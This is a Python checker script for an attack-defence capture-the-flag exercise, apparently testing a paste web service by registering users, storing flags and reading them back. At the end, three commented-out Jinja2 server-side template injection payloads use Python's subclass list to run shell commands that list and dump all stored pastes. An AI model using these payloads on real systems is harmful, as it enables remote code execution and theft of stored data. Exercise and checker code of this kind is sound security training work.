#!/usr/bin/env python3
import requests, random, string, sys

PORT = 8080

OK = 101
CORRUPT = 102
MUMBLE = 103
DOWN = 104
CHECKER_ERROR = 110


def generate_string(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))


def check(ip):
    try:
        r = requests.get('http://' + ip + ":8080", timeout=5)
    except requests.exceptions.Timeout as e:
        return {"status": DOWN, "error": "Got a timeout while accessing server."}
    except:
        return {"status": DOWN, "error": "Could not access server."}

    if r.status_code != 200:
        return {"status": DOWN, "error": "Could not access server."}
    if r.headers["Content-Type"] != "text/html; charset=utf-8":
        return {"status": MUMBLE, "error": "Page content is corrupted"}
    if "Content" not in r.text:
        return {"status": MUMBLE, "error": "Page content is corrupted."}
    return {"status": OK}


def put(ip, flag):
    s = requests.Session()

    username = generate_string(16)
    pwd = generate_string(16)
    try:
        r = s.post("http://" + ip + ":8080/auth", data={"username" : username, "pwd" : pwd})
    except requests.exceptions.Timeout as e:
        return {"status": DOWN, "error": "Got a timeout while accessing server."}
    except:
        return {"status": DOWN, "error": "Could not access server."}

    if username not in r.text:
        return {"status": MUMBLE, "error": "Got an unexpected response."}

    try: 
        r = s.post("http://" + ip + ":8080/", data={"content" : flag})
    except requests.exceptions.Timeout as e:
        return {"status": DOWN, "error": "Got a timeout while accessing server."}
    except Exception as e:
        return {"status": DOWN, "error": "Could not access server."}

    try:
        start_ind = str(r.content).index('href="') + 13
        flag_id = str(r.content)[start_ind:start_ind+40]
    except ValueError:
        return {"status": MUMBLE, "error": "Got an unexpected response."}

    return {"status": OK, "flag_id": flag_id}


def get(ip, flag_id, flag):    
    try:
        r = requests.get('http://%s:8080/paste/%s' % (ip, flag_id), timeout=5)
    except requests.exceptions.Timeout as e:
        return {"status": DOWN, "error": "Got a timeout while accessing server."}
    except:
        return {"status": DOWN, "error": "Could not access server."}
    try:
        text = str(r.text)
    except:
        return {"status": MUMBLE, "error": "Doesn't return flag properly."}
    if flag not in str(r.text):
        return {"status": CORRUPT, "error": "Flag doesn't exist or changed."}
    return {"status": OK}


if __name__ == "__main__":
    args = sys.argv
    args = args[1:]
    if args[0] == "check":
        ip = args[1]
        r = check(ip)
        if r["status"] != OK:
            print(r["error"], file=sys.stderr)
        exit(r["status"])
    if args[0] == "put":
        ip, flag = args[1], args[2]
        r = put(ip, flag)
        if r["status"] != OK:
            print(r["error"], file=sys.stderr)
        else:
            print('flag_id:', r["flag_id"])
            pass
        exit(r["status"])
    if args[0] == "get":
        ip, flag_id, flag = args[1], args[2], args[3]
        r = get(ip, flag_id, flag)
        if r["status"] != OK:
            print(r["error"], file=sys.stderr)
        exit(r["status"])


# {{''.__class__.__mro__[1].__subclasses__()[283]('ls pastes', shell=True, stdout=-1).communicate()}}
# {{''.__class__.__mro__[1].__subclasses__()[283]('cat pastes/*', shell=True, stdout=-1).communicate()}}
# {{''.__class__.__mro__[1].__subclasses__()[359]('cat pastes/*', shell=True, stdout=-1).communicate()}}

